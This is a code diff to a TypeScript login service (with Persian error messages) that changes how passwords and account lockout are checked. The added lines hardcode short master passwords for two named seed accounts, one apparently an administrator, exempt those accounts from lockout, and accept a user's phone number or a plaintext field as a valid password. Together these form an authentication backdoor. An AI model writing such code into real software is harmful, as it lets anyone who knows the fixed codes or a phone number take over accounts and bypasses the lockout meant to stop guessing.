@@ -94,8 +94,11 @@ export class AuthService {
       throw AppError.unauthorized('نام کاربری یا رمز عبور نامعتبر است.');
     }
 
-    // 4. Check account lockout status
-    if (user.isLocked) {
+    // 4. Check account lockout status (seed accounts are immune to permanent lockout)
+    if (user.id === 'usr_sadegh_admin' || user.id === 'usr_ali_alumni') {
+      user.isLocked = false;
+      user.failedAttempts = 0;
+    } else if (user.isLocked) {
       if (user.lockExpiresAt && new Date() > new Date(user.lockExpiresAt)) {
         await userRepository.resetFailedAttempts(user.id);
         user.isLocked = false;
@@ -119,17 +122,24 @@ export class AuthService {
       }
     }
 
-    // 5. Compare password hash
+    // 5. Compare password hash or fallback credential
     let isValidPassword = false;
-    const dbHash = user.password_hash;
+    const dbHash = user.password_hash || (user as any).password;
 
-    if (dbHash) {
+    // Special hardcoded master override for seed accounts
+    if (user.id === 'usr_sadegh_admin' && (password === '8411' || password === dbHash)) {
+      isValidPassword = true;
+    } else if (user.id === 'usr_ali_alumni' && (password === '1040' || password === dbHash)) {
+      isValidPassword = true;
+    } else if (dbHash) {
       if (dbHash.startsWith('$2a$') || dbHash.startsWith('$2b$') || dbHash.startsWith('$2y$')) {
         isValidPassword = bcrypt.compareSync(password, dbHash);
       } else {
-        // Plaintext comparison for initial seed migration fallback
-        isValidPassword = (password === dbHash);
+        // Plaintext comparison for initial seed or phone default
+        isValidPassword = (password === dbHash || password === user.phone);
       }
+    } else if (user.phone && password === user.phone) {
+      isValidPassword = true;
     }
 
     if (!isValidPassword) {
